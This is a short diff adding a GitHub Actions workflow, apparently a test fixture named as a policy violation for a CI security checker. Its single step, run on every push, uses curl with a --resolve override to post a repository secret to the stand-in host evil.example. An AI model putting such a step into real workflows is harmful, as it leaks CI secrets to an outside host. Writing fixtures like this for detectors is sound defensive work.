@@ -1,0 +1,8 @@
+name: violation_resolve_then_untrusted
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl --resolve evil.example:443:10.0.0.5 -d "k=${{ secrets.K }}" https://evil.example/
